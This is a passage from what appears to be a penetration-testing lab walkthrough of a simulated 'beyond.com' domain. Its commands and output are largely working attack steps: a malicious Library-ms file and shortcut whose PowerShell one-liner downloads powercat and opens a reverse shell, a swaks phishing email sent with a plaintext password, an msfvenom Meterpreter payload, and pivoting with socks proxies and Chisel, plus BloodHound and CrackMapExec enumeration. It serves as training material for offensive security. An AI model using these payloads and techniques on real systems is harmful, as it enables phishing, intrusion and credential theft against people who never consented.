$ xfreerdp /cert-ignore /drive:shared,/tmp /u:offsec /v:192.168.167.250
```

Open Visual Studio Code1 and create a new text file on the desktop named config.Library-ms.

Copy in the following Windows Library code and change the IP to the Kali IP.

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.158</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Save the file and transfer it to /home/kali/beyond.

Next, we'll create the shortcut file on WINPREP. For this, we'll right-click on the Desktop and select New > Shortcut. A victim double-clicking the shortcut file will download PowerCat and create a reverse shell.

Use this command in the Create Shortcut popup, replacing BOTH IPs with the Kali IP. On the next screen, name the shortcut "install".

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.158:8000/powercat.ps1'); powercat -c 192.168.45.158 -p 4444 -e powershell"
```

Transfer this second file to Kali. Move both of these files to /home/kali/beyond/webdav. (the WebDAV directory).

Our next step is to serve PowerCat via a Python3 web server, and then start a nc listener.

```console
$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

$ python3 -m http.server 8000

$ nc -nvlp 4444
```

NOTE: We could also use the WebDAV share to serve Powercat instead of the Python3 web server. However, serving the file via another port provides us additional flexibility.

Let's create the email.

```
$ cat body.txt
                       
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John


$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.167.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.167.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.167.242:25...
=== Connected to 192.168.167.242.
...
<-  354 OK, send.
 -> 42 lines sent
<-  250 Queued (1.063 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

Check your nc listener.

```console
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.158] from (UNKNOWN) [192.168.167.242] 62691
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> 

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus

PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1

PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.123.243  // !!
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.123.254
PS C:\Windows\System32\WindowsPowerShell\v1.0> 
```

Listing 40 shows that we landed on the CLIENTWK1 system as domain user marcus. In addition, the IP address of the system is 172.16.123.243/24, indicating an internal IP range. We should also document the IP address and network information, such as the subnet and gateway in our workspace directory.

## Enumerating the Internal Network

### Situational Awareness

Let's start with enumerating the CLIENTWK1 machine. Let's copy the 64-bit winPEAS executable to the directory served by the Python3 web server. On CLIENTWK1, we'll change the current directory to the home directory for marcus and download winPEAS from our Kali machine. Once downloaded, we'll launch it.

```console
marcus> cd C:\Users\marcus

kali/beyond$ cp '/usr/share/peass/winpeas/winPEASx64.exe' .                                

marcus> iwr -uri http://192.168.45.158:8000/winPEASx64.exe -Outfile winPEAS.exe

marcus> .\winPEAS.exe
```

Reviewing some of the results...

Basic System Information:

```
����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    Hostname: CLIENTWK1
    Domain Name: beyond.com
    ProductName: Windows 10 Pro
    EditionID: Professional
```

winPEAS may falsely detect Windows 11 as Windows 10, so let's manually check the operating system with systeminfo.

```console
marcus> systeminfo
systeminfo

Host Name:                 CLIENTWK1
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
```

AV Information:

```
����������͹ AV Information
  [X] Exception: Object reference not set to an instance of an object.
    No AV was detected!!
    Not Found
```

Network Ifaces and known hosts:

```
����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:BF:7E:0C]: 172.16.123.243 / 255.255.255.0
        Gateways: 172.16.123.254
        DNSs: 172.16.123.240
        Known hosts:
          172.16.123.240        00-50-56-BF-0F-C7     Dynamic    // !!
          172.16.123.254        00-50-56-BF-DA-5C     Dynamic    // !!
          172.16.123.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static
```

DNS Cached:

```
����������͹ DNS cached --limit 70--
    Entry                                 Name                                  Data
    dcsrv1.beyond.com                     DCSRV1.beyond.com                     172.16.123.240   // !!
    mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.123.254
```

Listing 45 shows that the DNS entries for mailsrv1.beyond.com (172.16.6.254) and dcsrv1.beyond.com (172.16.6.240) are cached on CLIENTWK1. Based on the name, we can assume that DCSRV1 is the domain controller of the beyond.com domain.

Furthermore, because MAILSRV1 is detected with the internal IP address of 172.16.6.254 and we enumerated the machine from an external perspective via 192.168.50.242, we can safely assume that this is a dual-homed host.

Create a txt file in /home/kali/beyond called computer.txt to document identified internal machines and additional information about them.

```
$ cat computer.txt
172.16.123.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.123.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.167.242)

172.16.123.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

Reviewing the rest of the winPEAS results, we don't find any actionable information to attempt a potential privilege escalation attack. However, we should remind ourselves that we are in a simulated penetration test and not in a CTF lab environment. Therefore, it is not necessary to get administrative privileges on every machine.

While we skipped over most of the winPEAS results, we should examine the results thoroughly as we would in a real penetration test. After the local enumeration of the system, we should have obtained key pieces of information, which we listed in the Situational Awareness section of the Windows Privilege Escalation Module.

Since we haven't identified a privilege escalation vector via winPEAS and there is nothing else actionable on the system, such as a Password Manager, let's start enumerating the AD environment and its objects.

```console
kali/beyond$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .

marcus> iwr -uri http://192.168.45.158:8000/SharpHound.ps1 -Outfile SharpHound.ps1

marcus> powershell -ep bypass

marcus> . .\SharpHound.ps1

marcus> Invoke-BloodHound -CollectionMethod All

marcus> dir
-a----         4/28/2024   8:32 AM          11813 20240428083201_BloodHound.zip                                        

$ impacket-smbserver myshare /tmp/ -smb2support -user kali -password kali

> net use \\192.168.45.158\myshare /user:kali kali

> copy 20240428083201_BloodHound.zip \\192.168.45.158\myshare\blood.zip

$ cp /tmp/blood.zip .                                             

$ cp /tmp/blood.zip .                                             

$ bloodhound
```

Upload the data in a new session. We are currently only interested in basic domain enum, so we will write our own queries.

Raw query to display all computers identified by the collector: MATCH (m:Computer) RETURN m

This query finds 4 computer objects in the domain. By clicking on the nodes, we can obtain additional information about the computer objects, such as the operating system.

```
DCSRV1.BEYOND.COM - Windows Server 2022 Standard
INTERNALSRV1.BEYOND.COM - Windows Server 2022 Standard
MAILSRV1.BEYOND.COM - Windows Server 2022 Standard
CLIENTWK1.BEYOND.COM - Windows 11 Pro
```

Let's obtain the IP address for the newly identified machine, INTERNALSRV1, with nslookup.

```console
marcus> nslookup INTERNALSRV1.BEYOND.COM
Server:  UnKnown
Address:  172.16.123.240

Name:    INTERNALSRV1.BEYOND.COM
Address:  172.16.123.241
```

Let's add this information to computer.txt on our Kali machine.

```
172.16.6.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.6.241 - INTERNALSRV1.BEYOND.COM

172.16.6.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

Now, in BloodHound, display all user accounts: MATCH (m:User) RETURN m

We find that, in addition to the default AD accounts, we have four more:

```
BECCY
JOHN
DANIELA
MARCUS
```

Let's update usernames.txt accordingly.

To be able to use some of BloodHound's pre-built queries, we can mark marcus (interactive shell on CLIENTWK1) and john (valid credentials) as Owned. To do this, we'll right-click on the MARCUS@BEYOND.COM and JOHN@BEYOND.COM nodes and select Mark User as Owned.

Now, display all domain administrators by using the pre-built Find all Domain Admins query under the Analysis tab.

Apart from the default domain Administrator account, beccy is also a member of the Domain Admins group.

We should also examine domain groups and GPOs. Enumerating both is often a powerful method to elevate our privileges in the domain or gain access to other systems. For this simulated penetration test, we'll skip these two enumeration steps as they provide no additional value for this environment.

Moving on, we'll run the following pre-built queries:

    Find Workstations where Domain Users can RDP
    Find Servers where Domain Users can RDP
    Find Computers where Domain Users are Local Admin
    Shortest Path to Domain Admins from Owned Principals

Unfortunately, none of these queries return any results. This means BloodHound didn't identify any workstations or servers where Domain Users can log in via RDP. In addition, no Domain Users are a local Administrator on any computer objects. Therefore, we don't have privileged access on any domain computers as john or marcus. Finally, there are no direct paths from owned users to the Domain Admins group that BloodHound could identify.

We could have also used PowerView or LDAP queries to obtain all of this information. However, in most penetration tests, we want to use BloodHound first as the output of the other methods can be quite overwhelming.

### Services and Sessions

To review active sessions, we'll again use a custom query in BloodHound. Since Cypher is a querying language, we can build a relationship query with the following syntax (NODES)-[:RELATIONSHIP]->(NODES). The relationship for our use case is [:HasSession]. The first node of the relationship specified by a property is (c:Computer) and the second is (m:User). Meaning, the edge between the two nodes has its source at the computer object. 

QUERY: MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

As expected, CLIENTWK1 has an active session with the user marcus.

Interestingly, the previously identified domain administrator account beccy has an active session on MAILSRV1. If we manage to get privileged access to this machine, we can potentially extract the NTLM hash for this user. The user of the third active session is displayed as a SID. BloodHound uses this representation of a principal when the domain identifier of the SID is from a local machine. For this session, this means that the local Administrator (indicated by RID 500) has an active session on INTERNALSRV1.

Our next step is to identify all kerberoastable users in the domain. To do so, we can use the List all Kerberoastable Accounts pre-built query in BloodHound.

Apart from krbtgt, daniela is also kerberoastable. We can often safely skip krbtgt in the context of Kerberoasting.

Click on daniela's node and examine the ServicePrincipalName for daniela in the NodeInfo menu: http/internalsrv1.beyond.com

We can assume that a web server is running on INTERNALSRV1. Once we've performed Kerberoasting and potentially obtained the plaintext password for daniela, we may use it to access INTERNALSRV1.

Keep enumerating.

Let's set up a SOCKS5 proxy to perform network enumeration via Nmap and CrackMapExec in order to identify accessible services, open ports, and SMB settings. First, we'll create a staged Meterpreter TCP reverse shell as an executable file with msfvenom. Since we can reuse the binary throughout the domain, we can store it in /home/kali/beyond.

```console
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.158 LPORT=443 -f exe -o met.exe

$ sudo msfconsole -q

$ use multi/handler

$ set payload windows/x64/meterpreter/reverse_tcp

$ set LHOST 192.168.45.158

$ set LPORT 443

$ set ExitOnSession false

$ run -j

marcus> iwr -uri http://192.168.45.158:8000/met.exe -Outfile met.exe

marcus> .\met.exe

// a new session should start 

msf6 exploit(multi/handler) > [*] Sending stage (200774 bytes) to 192.168.167.242
[*] Meterpreter session 1 opened (192.168.45.158:443 -> 192.168.167.242:63166) at 2024-04-28 12:56:20 -0400

$ use multi/manage/autoroute

$ set session 1

$ run
[+] Route added to subnet 172.16.123.0/255.255.255.0 from host's routing table.

$ use auxiliary/server/socks_proxy

$ set SRVHOST 127.0.0.1

$ set VERSION 5

$ run -j

// new kali terminal

$ cat /etc/proxychains4.conf
socks5  127.0.0.1 1080
```

Finally, we are set up to enumerate the network via Proxychains.

```console
// in kali/beyond/
$ proxychains -q crackmapexec smb 172.16.123.240-241 172.16.123.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
SMB         172.16.123.240  445    DCSRV1           [*] Windows 10.0 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
SMB         172.16.123.241  445    INTERNALSRV1     [*] Windows 10.0 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.123.254  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
...
```

john doesn't have actionable or interesting permissions on any of the discovered shares. As we already established via a pre-built BloodHound query and now through the scan, john as a normal domain user doesn't have local Administrator privileges on any of the machines in the domain.

NOTE: CrackMapExec version 5.4.0 may throw the error The NETBIOS connection with the remote host is timed out for DCSRV1, or doesn't provide any output at all. Version 5.4.1 contains a fix to address this issue

The output also states that MAILSRV1 and INTERNALSRV1 have SMB signing set to False. Without this security mechanism enabled, we can potentially perform relay attacks if we can force an authentication request.

Next, let's use Nmap to perform a port scan on ports commonly used by web applications and FTP servers targeting MAILSRV1, DCSRV1, and INTERNALSRV1.

```console
$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.123.240 172.16.123.241 172.16.123.254
Nmap scan report for 172.16.123.240
Host is up (4.7s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  closed http
443/tcp closed https

Nmap scan report for 172.16.123.241
Host is up (5.2s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http     // !!
443/tcp open   https    // !!

Nmap scan report for 172.16.123.254
Host is up (4.5s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http      // !!
443/tcp closed https
```

Nmap identified the open ports 80 and 443 on 172.16.123.241 (INTERNALSRV1) and port 80 on 172.16.123.254 (MAILSRV1). For now, we can skip the latter one as it's most likely the same web page and service we enumerated from an external perspective.

While we could use the SOCKS5 proxy and proxychains to browse to the open port on 172.16.6.241, we'll use Chisel6 as it provides a more stable and interactive browser session. From the [releases page](https://github.com/jpillora/chisel/releases/tag/v1.7.7), we download the Windows and Linux amd64 versions and extract the binaries in /home/kali/beyond/.

```console
$ chmod a+x chisel

$ ./chisel server -p 8080 --reverse
2024/04/28 13:15:01 server: Listening on http://0.0.0.0:8080
```

Then, we'll transfer the extracted chisel.exe binary to CLIENTWK1 by using Meterpreter's upload command.

```console
...
[*] Starting the SOCKS proxy server
meterpreter > sessions -i 1
[*] Starting interaction with 1...

meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe
```

Now, we can enter shell and utilize Chisel in client mode to connect back to our Kali machine on port 8080. We'll create a reverse port forward with the syntax R:localport:remotehost:remoteport. In our case, the remote host and port are 172.16.6.241 and 80. The local port we want to utilize is 80.

```console
// make sure you close your webdav server if you haven't already
C:\Users\marcus> .\chiselWin.exe client 192.168.45.158:8080 R:80:172.16.123.241:80
2024/04/28 10:28:17 client: Connected (Latency 56.6114ms)
```

Once Chisel connects, we can view port 80 on 172.16.123.241 by browsing on our Kali machine (127.0.0.1) by using Firefox.

127.0.0.1 shows us a WordPress instance (indicated by the URL and title of the page) on INTERNALSRV1. Let's browse to the dashboard login page for WordPress at http://127.0.0.1/wordpress/wp-admin and try to log into it with credentials we've discovered so far.

We might get redirected to the internal URL, so we can assume that the WordPress instance has the DNS name set as this address instead of the IP address. Add it to your /etc/hosts!

```console
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali      
...
127.0.0.1       internalsrv1.beyond.com      // !!
```

Now open the page again!

Let's try to log in with the credentials we've obtained so far as well as common username and password pairs, such as admin:admin. Unfortunately, none of them work.

## Attacking an Internal Web Application
